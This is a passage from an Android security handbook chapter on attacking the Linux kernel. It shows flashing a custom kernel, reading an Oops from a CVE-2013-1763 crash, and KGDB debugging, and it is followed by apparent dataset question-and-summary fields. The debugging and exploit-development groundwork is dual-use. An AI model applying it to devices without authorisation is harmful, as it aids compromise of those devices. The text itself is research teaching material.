Chapter 10 ■ Hacking and Attacking the Kernel\nOn the Galaxy Nexus:\ndev:~/android/src/kernel/omap/staging $ adb push new-boot.img /data/local/tmp\n2316 KB/s (4526080 bytes in 1.907s)\ndev:~/android/src/kernel/omap/staging $ adb shell\nshell@android:/data/local/tmp $ exec su\nroot@android:/data/local/tmp # dd if=boot.img \\\nof=/dev/block/platform/omap/omap_hsmmc.0/by-name/boot\n8800+0 records in\n8800+0 records out\n4505600 bytes transferred in 1.521 secs (2962261 bytes/sec)\nroot@android:/data/local/tmp # exit\ndev:~/android/src/kernel/omap/staging $ adb reboot\ndev:~/android/src/kernel/omap/staging $ adb wait-for-device shell cat \\\n/proc/version\nLinux version 3.0.31-g9f818de-dirty (jdrake@dev) (gcc version 4.7 (GCC) )...\nOn the Samsung Galaxy S III:\nNOTE When using this method, it’s not necessary to append the MD5 to the boot\nimage as is necessary when using Odin.\ndev:~/sgs3-md4 $ adb push boot.img /data/local/tmp\n2196 KB/s (5935360 bytes in 2.638s)\ndev:~/sgs3-md4 $ adb shell\nshell@android:/data/local/tmp $ exec su\nroot@android:/data/local/tmp # dd if=boot.img \\\nof=/dev/block/platform/msm_sdcc.1/by-name/boot\n11592+1 records in\n11592+1 records out\n5935360 bytes transferred in 1.531 secs (3876786 bytes/sec)\nroot@android:/data/local/tmp # exit\ndev:~/sgs3-md4 $ adb reboot\ndev:~/sgs3-md4 $ adb wait-for-device shell cat /proc/version\nLinux version 3.0.31 (jdrake@dev) (gcc version 4.6.x-google 20120106 ...\nIn each case, copy the image back to the device using ADB and then write it\ndirectly to the block for the boot partition device using dd. After the command\ncompletes, reboot the device and shell in to confi rm that the custom kernel is\nbeing used.\nDebugging the Kernel\nMaking sense of kernel bugs requires peering deep into the internals of the\noperating system. Triggering kernel bugs can result in a variety of undesired\nbehaviors, including panics, hangs, and memory corruption. In most cases, trig-\ngering bugs leads to a kernel panic and thus a reboot. In order to understand\nthe root cause issues, debugging facilities are extremely useful.\nLuckily, the Linux kernel used by Android contains a multitude of facilities\ndesigned and implemented just for this purpose. You can debug crashes after\nc10.indd 11:11:6:AM 02/25/2014 Page 336\nChapter 10 ■ Hacking and Attacking the Kernel 337\nthey occur in several ways. Which methods are available depends on the par-\nticular device you’re using for testing. When developing exploits, tracing or live\ndebugging helps a developer understand subtle complexities. This section covers\nthese debugging facilities and provides detailed examples of using some of them.\nObtaining Kernel Crash Reports\nA vast majority of Android devices simply reboot whenever an error occurs\nin kernel-space. This includes not only memory access errors but also kernel\nmode assertions (BUG) or other error conditions. This behavior is very disrup-\ntive when conducting security research. Fortunately, there are several ways to\ndeal with this and obtain useful crash information.\nPrior to rebooting, the Linux kernel sends crash-related information to the\nkernel log. Accessing this log is typically accomplished by executing the dmesg\ncommand from a shell. In addition to the dmesg command, it’s possible to con-\ntinuously monitor the kernel log using the kmsg entry in the proc fi le system.\nThe full path to this entry is /proc/kmsg.\nIt might not be possible to access these facilities without root access. On most\ndevices, access to /proc/kmsg is limited to the root user or users in the system\ngroup. Older devices only allow access from the root user. Additionally, the\ndmesg command can be restricted to the root user by using the dmesg_restrict\nparameter discussed in Chapter 12.\nIn addition to the live kernel log, Android offers another facility for obtaining\ncrash information after the device successfully reboots. On devices that support\nthis facility (those with CONFIG_ANDROID_RAM_CONSOLE enabled), the kernel log\nprior to the reboot is available from the last_kmsg entry in the proc fi le system.\nThe full path to this entry is /proc/last_kmsg. Unlike dmesg and /proc/kmsg,\naccessing this entry usually does not require root access. This is advantageous\nwhen attempting to exploit a previously unknown kernel bug to gain initial\nroot access to a device.\nYou can fi nd other relevant directories by inspecting an Android device. One\nsuch directory is the /data/dontpanic directory. The init.rc script on many\ndevices contains commands to copy the contents of several proc fi le system\nentries to such directories. The following excerpt from the init.rc of a Motorola\nDroid 3 running Verizon’s Android 2.3.4 build is an example:\nshell@cdma_solana:/# grep -n 'copy.*dontpanic' /init*\n/init.mapphone_cdma.rc:136: copy /proc/last_kmsg /data/dontpanic/last_kmsg\n/init.mapphone_cdma.rc:141: copy /data/dontpanic/apanic_console\n/data/logger/last_apanic_console\n[...]\n/init.rc:127: copy /proc/apanic_console /data/dontpanic/apanic_console\n/init.rc:131: copy /proc/apanic_threads /data/dontpanic/apanic_threads\nc10.indd 11:11:6:AM 02/25/2014 Page 337\n338 Chapter 10 ■ Hacking and Attacking the Kernel\nHere, the last_kmsg, apanic_console, and apanic_threads proc entries are\ncopied. The latter two entries do not exist on most Android devices; so they offer\nno help when debugging. Besides /data/dontpanic, another directory, /data/\nlogger, is also used. Inspecting the init.rc fi les on a different device might\nreveal other directories. However, this method is less likely to be fruitful than\naccessing /proc/kmsg and /proc/last_kmsg directly.\nThe fi nal method prevents the device from rebooting when the kernel encoun-\nters an error. The Linux kernel contains a pair of runtime confi guration param-\neters that control what happens when problems occur. First, the /proc/sys/\nkernel/panic entry controls how many seconds to wait before rebooting after\na panic occurs. Android devices typically set this to 1 or 5 seconds. Setting it\nto zero, as shown below, prevents rebooting.\nWARNING Use caution when changing the default panic behavior. Although not\nrebooting may seem like the most attractive method, continuing after errors occur in\nthe kernel can lead to data loss or worse.\nshell@android:/ $ cat /proc/sys/kernel/panic\n5\nshell@android:/ $ su -c 'echo 0 > /proc/sys/kernel/panic'\nshell@android:/ $ cat /proc/sys/kernel/panic\n0\nAnother entry, /proc/sys/kernel/panic_on_oops, controls whether or not\nan Oops (discussed in the next section) triggers a panic at all. It is enabled by\ndefault, but you can disable it easily, as shown here:\nshell@android:/ $ cat /proc/sys/kernel/panic_on_oops\n1\nshell@android:/ $ su -c 'echo 0 > /proc/sys/kernel/panic_on_oops'\nshell@android:/ $ cat /proc/sys/kernel/panic_on_oops\n0\nUsing these methods, it is possible to obtain kernel crash information. Now\nyou must make sense of this information to understand what issue is occurring\nin kernel space.\nUnderstanding an Oops\nKernel crash information is often referred to as an Oops. An Oops is nothing\nmore than a brief crash dump. It contains information such as a general classifi ca-\ntion, register values, data pointed to by the registers, information about loaded\nmodules, and a stack trace. Each piece of information is provided only when\nit is available. For example, if the stack pointer gets corrupted, it is impossible\nc10.indd 11:11:6:AM 02/25/2014 Page 338\nChapter 10 ■ Hacking and Attacking the Kernel 339\nto construct a proper stack trace. The remainder of this section examines an\nOops message from a Nexus 4 running Android 4.2.2. The full text of this\nOops is included with this book’s extra materials at http://www.wiley.com/\ngo/androidhackershandbook.\nNOTE The kernel used for this section contains modifi cations from LG Electronics.\nAs such, some information might not appear in Oops messages from other devices.\nThis particular Oops occurred when triggering CVE-2013-1763, which lies\nin the sock_diag_lock_handler function. More about this particular issue\nis covered in a case study in the “sock_diag” section later in this chapter.\nRather than focus on that particular vulnerability here, let’s focus on the\nunderstanding Oops message itself.\nThe fi rst line of the Oops indicates that an attempt was made to access\nmemory that was not mapped. This line is generated from the __do_ker-\nnel_fault function in arch/arm/mm/fault.c.\nUnable to handle kernel paging request at virtual address 00360004\nThe kernel attempted to read from the user-space address 0x00360004. Because\nnothing was mapped at this address in the user-space process that triggered\nthis issue, a page fault occurred.\nThe second and third lines deal with page table entries. These lines are gener-\nated from the show_pte function, also in arch/arm/mm/fault.c.\npgd = e9d08000\n[00360004] *pgd=00000000\nThe second line shows the location of the Page Global Directory (PGD), whereas\nthe third line shows the value within the PGD for this address and the address\nitself. Here, the *pgd value 0x00000000 indicates that this address is not mapped.\nPage tables serve many purposes. Primarily, they are used to translate virtual\nmemory addresses into physical RAM addresses. They also track memory per-\nmissions and swap status. On 32-bit systems, page tables also manage system-\nwide use of physical memory beyond what the address space would normally\nallow. This allows a 32-bit system to utilize more than 4GB of RAM, even when\na single 32-bit process cannot address all of it. You can fi nd more information\nabout page tables and page fault handling in the book Understanding the Linux\nKernel, 3rd edition, or inside the Documentation/vm directory in the Linux kernel\nsource tree.\nFollowing the page table information, the Oops message includes a line con-\ntaining several useful pieces of information:\nc10.indd 11:11:6:AM 02/25/2014 Page 339\n340 Chapter 10 ■ Hacking and Attacking the Kernel\nInternal error: Oops: 5 [#1] PREEMPT SMP ARM\nDespite being only a single line, this line is packed with information. This line\nis emitted from the __die function in arch/arm/kernel/traps.c. The fi rst part\nof the string, Internal error, is static text inside the kernel source. The next\npart, Oops, is passed in from the calling function. Other call sites use different\nstrings to indicate what type of error occurred. The next part, 5, indicates the\nnumber of times the __die function has executed, though it is unclear why it\nshows 5 here. The remainder of the line shows various features that the kernel\nwas compiled with. Here the kernel was compiled with preemptive multi-tasking\n(PREEMPT), symmetric multi-processing (SMP), and using the ARM execution mode.\nThe next several lines are generated from the __show_regs function in arch/\narm/kernel/process.c. This information is some of the most important infor-\nmation in the Oops message. It is in these lines where you fi nd out where the\ncrash occurred in the code and what state the CPU was in when it happened. The\nfollowing line begins with the number of the CPU on which the fault occurred.\nCPU: 0 Not tainted (3.4.0-perf-g7ce11cd ind#1)\nAfter the CPU number, the next fi eld shows whether or not the kernel was\ntainted. Here the kernel is not tainted, but if it were it would say Tainted here\nand would be followed by several characters that indicate exactly how the kernel\nwas tainted. For example, loading a module that violates the GPL causes the\nkernel to become tainted and is indicated by the G character. Finally, the kernel\nversion and build number is included. This information is especially useful\nwhen handling large amounts of Oops data.\nThe next two lines show locations within the kernel’s code segment where\nthings went wrong:\nPC is at sock_diag_rcv_msg+0x80/0xb4\nLR is at sock_diag_rcv_msg+0x68/0xb4\nThese two lines show the symbolic values of the pc and lr CPU registers,\nwhich correspond to the current code location and its calling function. The\nsymbolic name is retrieved using the print_symbol function. If no symbol is\navailable, the literal register value will be displayed. With this value in hand, one\ncan easily locate the faulty code using IDA pro or an attached kernel debugger.\nThe next fi ve lines contain full register information:\npc : <c066ba8c> lr : <c066ba74> psr: 20000013\nsp : ecf7dcd0 ip : 00000006 fp : ecf7debc\nr10: 00000012 r9 : 00000012 r8 : 00000000\nr7 : ecf7dd04 r6 : c108bb4c r5 : ea9d6600 r4 : ee2bb600\nr3 : 00360000 r2 : ecf7dcc8 r1 : ea9d6600 r0 : c0de8c1c\nThese lines contain the literal values for each register. Such values can be\nvery helpful when tracking code fl ow backward from the crashing instruction,\nc10.indd 11:11:6:AM 02/25/2014 Page 340\nChapter 10 ■ Hacking and Attacking the Kernel 341\nespecially when combined with memory content information that appears later\nin the Oops message. The fi nal line of the literal register value block shows\nvarious encoded fl ags:\nFlags: nzCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user\nThe fl ags are decoded into a human readable representation. The fi rst group,\nwhich is nzCv here, corresponds to the Arithmetic Logic Unit (ALU) status fl ags\nstored in the cpsr register. If a fl ag is on, it will be shown with a capital letter.\nOtherwise, it will be shown in lowercase. In this Oops, the carry fl ag is set, but\nthe negative, zero, and overfl ow fl ags are unset.\nFollowing the ALU status fl ags, the line shows whether or not interrupts or\nfast interrupts are enabled. Next, the Oops shows what mode the processor was\nin at the time of the crash. Because the crash occurred in kernel-space, the value\nis SVC_32 here. The next two words indicate the instruction set architecture\n(ISA) in use at the time of the crash. Finally, the line indicates whether the cur-\nrent segment is in kernel-space or user-space memory. Here it is in user-space.\nThis is a red fl ag because the kernel should never attempt to access unmapped\nmemory in user-space.\nThe next line, which concludes the output generated by the __show_regs\nfunction, contains information that is specifi c to ARM processors.\nControl: 10c5787d Table: aa70806a DAC: 00000015\nHere, three fi elds appear: Control, Table, and DAC. These correspond to the\nspecial privileged ARM registers c1, c2, and c3, respectively. The c1 register,\nas its label suggests, is the ARM processor’s control register. This register is\nused for confi guring several low-level settings like memory alignment, cache,\ninterrupts, and more. The c2 register is for the Translation Table Base Register\n(TTBR0). This holds the address of the fi rst level page table. Finally, the c3 register\nis the Domain Access Control (DAC) register. It specifi es the permission levels\nfor up to 16 domains, two bits each. Each domain can be set to provide access\nto user-space, kernel-space, or neither.\nThe following section, output by the show_extra_register_data function,\ndisplays the contents of virtual memory where the general purpose registers\npoint. If a register does not point at a mapped address, it will be omitted or\nappear with asterisks instead of data.\nPC: 0xc066ba0c:\nba0c e92d4070 e1a04000 e1d130b4 e1a05001 e3530012 3a000021 e3530013 9a000002\n[...]\nLR: 0xc066b9f4:\nb9f4 eb005564 e1a00004 e8bd4038 ea052f6a c0de8c08 c066ba0c e92d4070 e1a04000\n[...]\nSP: 0xecf7dc50:\ndc50 c0df1040 00000002 c222a440 00000000 00000000 c00f5d14 00000069 eb2c71a4\n[...]\nc10.indd 11:11:6:AM 02/25/2014 Page 341\n342 Chapter 10 ■ Hacking and Attacking the Kernel\nMore specifi cally, these blocks display 256 bytes of memory starting 128 bytes\nbefore the value of each register. The contents of memory where PC and LR point\nare particularly useful, especially when combined with the decodecode script\nincluded with the Linux kernel source. This script is used in the case study in\nthe “sock_diag” section later in this chapter.\nAfter the memory contents section, the __die function displays more detail\nabout the process that triggered the fault.\nProcess sock_diag (pid: 2273, stack limit = 0xecf7c2f0)\nStack: (0xecf7dcd0 to 0xecf7e000)\ndcc0: ea9d6600 ee2bb600 c066ba0c c0680fdc\ndce0: c0de8c08 ee2bb600 ea065000 c066b9f8 c066b9d8 ef166200 ee2bb600 c067fc40\ndd00: ea065000 7fffffff 00000000 ee2bb600 ea065000 00000000 ecf7df7c ecf7dd78\n[...]\nThe fi rst line shows the name, process ID, and the top of the kernel stack\nfor the thread. For certain processes, this function also shows the live portion\nof kernel stack data, ranging from sp to the bottom. After that, a call stack is\ndisplayed as follows:\n[<c066ba8c>] (sock_diag_rcv_msg+0x80/0xb4) from [<c0680fdc>]\n(netlink_rcv_skb+0x50/0xac)\n[<c0680fdc>] (netlink_rcv_skb+0x50/0xac) from [<c066b9f8>]\n(sock_diag_rcv+0x20/0x34)\n[<c066b9f8>] (sock_diag_rcv+0x20/0x34) from [<c067fc40>]\n(netlink_unicast+0x14c/0x1e8)\n[<c067fc40>] (netlink_unicast+0x14c/0x1e8) from [<c06803a4>]\n(netlink_sendmsg+0x278/0x310)\n[<c06803a4>] (netlink_sendmsg+0x278/0x310) from [<c064a20c>]\n(sock_sendmsg+0xa4/0xc0)\n[<c064a20c>] (sock_sendmsg+0xa4/0xc0) from [<c064a3f4>]\n(__sys_sendmsg+0x1cc/0x284)\n[<c064a3f4>] (__sys_sendmsg+0x1cc/0x284) from [<c064b548>]\n(sys_sendmsg+0x3c/0x60)\n[<c064b548>] (sys_sendmsg+0x3c/0x60) from [<c000d940>]\n(ret_fast_syscall+0x0/0x30)\nThe call stack shows the exact path that led to the fault, including symbolic\nfunction names. Further, the lr values for each frame are displayed. From this,\nit’s easy to spot subtle stack corruption.\nNext, the dump_instr function is used to display the four user-space instruc-\ntions leading to the fault:\nCode: e5963008 e3530000 03e04001 0a000004 (e5933004)\nAlthough the utility of displaying this data seems questionable, it could be\nused to diagnose issues such as the Intel 0xf00f bug.\nc10.indd 11:11:6:AM 02/25/2014 Page 342\nChapter 10 ■ Hacking and Attacking the Kernel 343\nAfter returning from the __die function, the die function resumes. The\nfunction calls oops_exit, which displays a random value meant to uniquely\nidentify the Oops.\n---[ end trace 3162958b5078dabf ]---\nFinally, if the panic_on_oops fl ag is set, the kernel prints a fi nal message and\nhalts:\nKernel panic - not syncing: Fatal exception\nThe Linux kernel Oops provides a wealth of information pertaining to the\nactivities of the kernel when an issue arises. This type of information is extremely\nhelpful when tracking down the root cause.\nLive Debugging with KGDB\nOn occasion debugging with only kernel crash logs is not enough. To deal with\nthis problem, the kernel includes several confi guration options and facilities\nfor debugging in real time. Searching the .config fi le for the string “DEBUG”\nreveals more than 80 debug-related options. Searching for the word “debug”\nin the Documentation directory shows more than 2,300 occurrences. Looking\ncloser, these features do anything from increasing debug logging to enabling\nfull interactive debugging.\nThe most interactive debugging experience available is provided by KGDB. It\nisn’t necessarily always the best option, though. For example, setting breakpoints\nin frequently hit areas is often very slow. Custom instrumentation or facilities\nlike Kprobes are better suited when debugging such situations. Nevertheless,\nthis section is about interactive debugging with KGDB. Before you get going,\nyou need to do some preparations on both the device and the development\nmachine. Following that, you can attach and see KGDB in action.\nPreparing the Device\nThe Linux kernel supports KGDB over USB and console ports. These mechanisms\nare controlled by the kgdbdbgp and kgdboc kernel command-line parameters,\nrespectively. Unfortunately, both options require special preparations. Using a\nUSB port requires a special USB driver whereas using a console port requires\naccess to a serial port on the device itself. Because information on accessing the\nserial port of the Galaxy Nexus is widely available, using its console port for\ndemonstration purposes is ideal. More information about creating the necessary\ncable is included in Chapter 13.\nc10.indd 11:11:6:AM 02/25/2014 Page 343\n344 Chapter 10 ■ Hacking and Attacking the Kernel\nAfter the cable is made, you build a custom boot image for the device. To get\neverything working, you need to create both a custom kernel and RAM disk.\nBecause the kernel will take a while to build, start creating the custom ker-\nnel fi rst. To get KGDB working, you need to tweak two things in the kernel:\nthe confi guration and the board serial initialization code. The confi guration\nparameters that need to be changed are summarized in Table 10-1.\nTable 10-1: Confi guration Parameters Needed to Enable KGDB\nFEATURE DESCRIPTION\nCONFIG_KGDB=y Enable KGDB support in the kernel.\nThe Galaxy Nexus ships with the FIQ debugger enabled.\nCONFIG_OMAP_FIQ_\nDEBUGGER=n Disable it to prevent confl icts with using the serial port for\nKGDB.\nCONFIG_CMDLINE=[...] Set kgdboc to use the correct serial port and the baud rate.\nSet the boot console to use the serial port, too.\nCONFIG_WATCHDOG=n Prevent the watchdog from rebooting the device while\ndebugging.\nCONFIG_OMAP_\nWATCHDOG=n\nNow, the custom kernel needs a slight modifi cation in order to use the serial\nport connected to your custom cable. This is only a one line change to the\nOpen Multimedia Applications Platform (OMAP) board’s serial initialization\ncode. A patch that implements this change (kgdb-tuna-usb-serial.diff) and\na confi guration template matching the settings in Table 10-1 are included with\nthis chapter’s downloadable material available at http://www.wiley.com/go/\nandroidhackershandbook\nTo build the kernel, follow the steps provided in the “Running Custom Kernel\nCode” section earlier in this chapter. Rather than use the tuna_defconfig template,\nuse the supplied tunakgdb_defconfig. The commands to do so are shown here:\ndev:~/android/src/kernel/omap $ make tunakgdb_defconfig\n[...]\ndev:~/android/src/kernel/omap $ make -j 6 ; make modules\n[...]\nWhile the kernel is building, you can start building the custom RAM disk.\nYou need to build a custom initrd.img in order to access the device via ADB.\nRemember, the Micro USB port on the Galaxy Nexus is now being used as a\nserial port. That means ADB over USB is out of the question. Thankfully, ADB\nsupports listening on a TCP port through the use of the service.adb.tcp.port\nsystem property. The relevant commands follow.\nc10.indd 11:11:6:AM 02/25/2014 Page 344\nChapter 10 ■ Hacking and Attacking the Kernel 345\nWARNING The abootimg-pack-initrd command doesn’t produce Nexus-\ncompatible initrd images. Instead, use mkbootfs from the system/core/cpio\ndirectory in the AOSP repository. It is built as part of an AOSP image build.\ndev:~/android/src/kernel/omap $ mkdir -p initrd && cd $_\ndev:~/android/src/kernel/omap/initrd $ abootimg -x \\\n~/android/takju-jdq39/boot.img\n[...]\ndev:~/android/src/kernel/omap/initrd $ abootimg-unpack-initrd\n1164 blocks\ndev:~/android/src/kernel/omap/initrd $ patch -p0 < maguro-tcpadb-initrc.diff\npatching file ramdisk/init.rc\ndev:~/android/src/kernel/omap/initrd $ mkbootfs ramdisk/ | gzip > \\\ntcpadb-initrd.img\nIn these steps, you extract the initrd.img from the stock boot.img. Then you\nunpack the initrd.img into the ramdisk directory using the abootimg-unpack-\ninitrd command. Next, apply a patch to the init.rc in order to enable ADB\nover TCP. This patch is included with this chapter’s materials. Finally, repack\nthe modifi ed contents into tcpadb-initrd.img.\nThe fi nal steps depend on the kernel build completing. When it is done,\nexecute a few more familiar commands:\ndev:~/android/src/kernel/omap/initrd $ mkbootimg --kernel \\\n../arch/arm/boot/zImage --ramdisk tcpadb-initrd.img -o kgdb-boot.img\ndev:~/android/src/kernel/omap/initrd $ adb reboot bootloader\ndev:~/android/src/kernel/omap/initrd $ fastboot flash boot kgdb-boot.img\ndev:~/android/src/kernel/omap/initrd $ fastboot reboot\nAt this point the device will be booting up with your new kernel and will\nhave ADB over TCP enabled. Make sure the device can connect to your develop-\nment machine via Wi-Fi. Connect to the device using ADB over TCP as follows:\ndev:~/android/src/kernel/omap $ adb connect 10.0.0.22\nconnected to 10.0.0.22:5555\ndev:~/android/src/kernel/omap $ adb -s 10.0.0.22:5555 shell\nshell@android:/ $\nOn a fi nal note, this particular confi guration can be a bit fl aky. As soon as\nthe device’s screen dims or turns off, two things happen: Wi-Fi performance\nseverely degrades and the serial port is disabled. To make matters worse, the\nbuilt-in options for keeping the screen on won’t work. The normal settings menu\nallows extending the display timeout to ten minutes; but that’s not enough. Then\nthere’s the development setting “stay awake” that keeps the screen on as long\nas the battery is charging. However, the device’s battery will not charge while\nyou use the custom serial port cable. Luckily, several Android apps in Google\nPlay are specifi cally designed to keep the device’s screen on indefi nitely. Using\none of these apps immediately after booting up makes a huge difference.\nc10.indd 11:11:6:AM 02/25/2014 Page 345\n346 Chapter 10 ■ Hacking and Attacking the Kernel\nPreparing the Host\nThere are only a few things left to do to get the host prepared for debugging\nthe device’s kernel. Most of the steps are already complete by this point. When\npreparing the device, you have already set up your build environment and cre-\nated a kernel binary that contains full symbols. There’s really only one thing\nleft before you connect the debugger.\nWhen you confi gured the kernel, you set the kernel command line to use the\nserial port for two purposes. First, you told the kernel that KGDB should use\nthe serial port via the kgdboc parameter. Second, you told the kernel that the\nserial port should be your console via the androidboot.console parameter. In\norder to separate these two streams of data, use a program called agent-proxy,\nwhich is available from the upstream Linux kernel’s Git repositories at git://\ngit.kernel.org/pub/scm/utils/kernel/kgdb/agent-proxy.git. The following\nexcerpt shows the usage of agent-proxy:\ndev:~/android/src/kernel/omap $ ./agent-proxy/agent-proxy 4440^4441 0 \\\n/dev/ttyUSB0,115200 & sleep 1\n[1] 27970\nAgent Proxy 1.96 Started with: 4440^4441 0 /dev/ttyUSB0,115200\nAgent Proxy running. pid: 28314\ndev:~/android/src/kernel/omap $ nc -t -d localhost 4440 & sleep 1\n[2] 28425\n[ 4364.177001] max17040 4-0036: online = 1 vcell = 3896250 soc = 77 status =\n2\nhealth = 1 temp = 310 charger status = 0\n[...]\nLaunch agent-proxy in the background while specifying that it should split\nKGDB and console communications to port 4440 and 4441, respectively. Give\nit the serial port and baud rate and off you go. When you connect to port 4440\nwith Netcat, you see console output. Excellent!\nConnecting the Debugger\nNow that everything is in place, connecting the debugger is simple and straight-\nforward. The following GDB script automates most of the process:\nset remoteflow off\nset remotebaud 115200\ntarget remote :4441\nTo get started, execute the arm-eabi-gdb binary as follows:\ndev:~/android/src/kernel/omap $ arm-eabi-gdb -q -x kgdb.gdb ./vmlinux\nReading symbols from /home/dev/android/src/kernel/omap/vmlinux...done.\n[...]\nIn addition to telling GDB to execute the small script, you also tell the GDB\nclient to use the vmlinux binary as its executable fi le. In doing so, you’ve told\nc10.indd 11:11:6:AM 02/25/2014 Page 346\nChapter 10 ■ Hacking and Attacking the Kernel 347\nGDB where to fi nd all the symbols for the kernel, and thus where to fi nd the\ncorresponding source code.\nThe GDB client sits waiting for something to happen. If you want to take\ncontrol, run the following command on the device as root.\nroot@android:/ # echo g > /proc/sysrq-trigger\nAt this point (before the new line is even drawn) the GDB client shows the\nfollowing.\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nkgdb_breakpoint () at kernel/debug/debug_core.c:954\n954 arch_kgdb_breakpoint();\n(gdb)\nFrom here you can set breakpoints, inspect the code, modify kernel memory,\nand more. You have achieved fully interactive source-level remote debugging\nof the device’s kernel!\nSetting a Breakpoint in a Module\nAs a fi nal example of debugging the kernel, this section explains how to set a\nbreakpoint in the provided “Hello World” module. Dealing with kernel mod-\nules in KGDB requires a bit of extra work. After loading the module, look to\nsee where it’s loaded:\nroot@android:/data/local/tmp # echo 1 > /proc/sys/kernel/kptr_restrict\nroot@android:/data/local/tmp # lsmod\nahh_helloworld_mod 657 0 - Live 0xbf010000\nTo see the address of the module, fi rst relax the kptr_restrict mitigation\nslightly. Then, list the loaded modules with the lsmod command or by inspect-\ning /proc/modules. Use the discovered address to tell GDB where to fi nd this\nmodule:\n(gdb) add-symbol-file drivers/ahh_helloworld/ahh_helloworld_mod.ko 0xbf010000\nadd symbol table from file \"drivers/ahh_helloworld/ahh_helloworld_mod.ko\" at\n.text_addr = 0xbf010000\n(y or n) y\n(gdb) x/i 0xbf010000\n0xbf010000 <init_module>: mov r12, sp\n(gdb) l init_module\n[...]\n12 int init_module(void)\n13 {\n14 printk(KERN_INFO \"%s: HELLO WORLD!@#!@#\\n\", __this_module.name);\n[...]\n(gdb) break cleanup_module\nBreakpoint 1 at 0xbf010034: file drivers/ahh_helloworld/ahh_helloworld_mod.c,\nline 20.\n(gdb) cont\nc10.indd 11:11:6:AM 02/25/2014 Page 347\n348 Chapter 10 ■ Hacking and Attacking the Kernel\nAfter GDB has loaded the symbols, it knows about the source code of the\nmodule, too. Creating breakpoints works as well. When the module is eventu-\nally unloaded, the breakpoint triggers:\nBreakpoint 1, 0xbf010034 in cleanup_module () at\ndrivers/ahh_helloworld/ahh_helloworld_mod.c:20\n20 {\nNo matter how one chooses to do so, debugging the kernel is an absolute neces-\nsity when tracking down or exploiting complex vulnerabilities. Debugging post\nmortem or live, using crash dumps or debugging interactively, these methods\nhelp a researcher or developer achieve a deep understanding of the issues at play.\nExploiting the Kernel\nAndroid 4.1, code named Jelly Bean, marked an important point in the evolution\nof Android security. That release, as discussed further in Chapter 12, fi nally\nmade user-space exploitation much more diffi cult. Further, the Android team\ninvested heavily in bringing SELinux to the platform. Taking both of these facts\ninto consideration, attacking the Linux kernel itself becomes a clear choice. As\nfar as exploitation targets go, the Linux kernel is relatively soft. Though there\nare a few effective mitigations in place, there is much left to be desired.\nSeveral wonderful resources on kernel exploitation have been published\nover the last decade. Among all of the presentation slide decks, blog posts,\nwhite papers, and exploit code published, one shines particularly brightly. That\nresource is the book A Guide to Kernel Exploitation: Attacking the Core by Enrico\nPerla and Massimiliano Oldani (Syngress, 2010). It covers a range of topics,\nincluding kernels other than just Linux. However, it doesn’t cover any ARM\narchitecture topics. This section aims to shed light on exploiting the Linux kernel\non Android devices by discussing typical kernel confi gurations and examining\na few exploitation case studies.\nTypical Android Kernels\nLike many other aspects of the Android devices, the Linux kernels used vary\nfrom device to device. The differences include the version of the kernel, exact\nconfi guration options, device-specifi c drivers, and more. Despite their differences,\nmany things remain the same throughout. This section describes some of the\ndifferences and similarities between the Linux kernels used on Android devices.\nVersions\nThe particular version of the kernel varies quite a bit but falls roughly into four\ngroups: 2.6.x, 3.0.x, 3.1.x, and 3.4.x. The groups that use these particular versions\nc10.indd 11:11:6:AM 02/25/2014 Page 348\nChapter 10 ■ Hacking and Attacking the Kernel 349\ncan be thought of as generations with the fi rst generation of devices using 2.6.x\nand the newest generation using 3.4.x. Android 4.0 Ice Cream Sandwich was\nthe fi rst to use a kernel from the 3.0.x series. Several early Jelly Bean devices,\nlike the 2012 Nexus 7, use a 3.1.x kernel. The Nexus 4, which was the fi rst to use\na 3.4.x kernel, shipped with Android 4.2. As of this writing, no mainstream\nAndroid devices use a kernel newer than 3.4.x despite the latest Linux kernel\nversion being 3.12.\nConfi gurations\nOver the years, the Android team made changes to the recommended confi gu-\nration of an Android device. The Android developer documentation and CDD\nspecify some of these settings. Further, the Compatibility Test Suite (CTS) verifi es\nthat some kernel confi guration requirements are met. For example, it checks\ntwo particular confi guration options, CONFIG_IKCONFIG and CONFIG_MODULES,\nfor newer versions of Android. Presumably for security reasons, both of these\nsettings must be disabled. Disabling loadable module support makes gaining\ncode executing in kernel-space more diffi cult after root access has been obtained.\nThe CTS check that verifi es that the embedded kernel confi guration is disabled\nstates “Compiling the confi g fi le into the kernel leaks the kernel base address\nvia CONFIG_PHYS_OFFSET.” Beyond these two settings, additional require-\nments that are described in Chapter 12 are also checked. A deeper examina-\ntion of kernel confi guration changes across a range of devices may reveal other\ninteresting patterns.\nThe Kernel Heap\nPerhaps one of the most relevant kernel confi guration details relates to kernel\nheap memory. The Linux kernel has a variety of memory allocation APIs with\nmost of them boiling down to kmalloc. At compile time, the build engineer\nmust choose between one of three different underlying heap implementations:\nSLAB, SLUB, or SLOB. A majority of Android devices use the SLAB allocator:\na few use the SLUB allocator. No Android devices are known to use the SLOB\nallocator, though it’s diffi cult to rule it out entirely.\nUnlike much of the rest of the kernel address space, heap allocations have\nsome entropy. The exact state of the kernel heap is infl uenced by many factors.\nFor one, all of the heap operations that have taken place between boot and when\nan exploit runs are largely unknown. Secondly, attacking remotely or from an\nunprivileged position means that the attacker will have little control over ongo-\ning operations that might be infl uencing the heap while the exploit is running.\nFrom a programmer’s point of view, the details of a given heap implementa-\ntion aren't very important. However, from an exploit developer’s point of view,\nthe details make all of the difference between a reliable code execution exploit\nand a worthless crash. A Guide to Kernel Exploitation and the Phrack article that\nc10.indd 11:11:6:AM 02/25/2014 Page 349"
  },
  {
    "input": "What are the key methods and techniques used to exploit the Linux kernel on Android devices, and how do they leverage the kernel's address space layout and memory management vulnerabilities?",
    "summary": "This chapter discusses how to hack and attack the Linux kernel used in Android devices, highlighting that the kernel's monolithic design and configuration make it easier to exploit compared to user-space code. It covers techniques for extracting kernel addresses and provides case studies on specific vulnerabilities like array index errors and memory corruption. The chapter also explains how to modify and exploit these vulnerabilities to gain root access, and offers tools and methods for kernel exploit development on Android.",
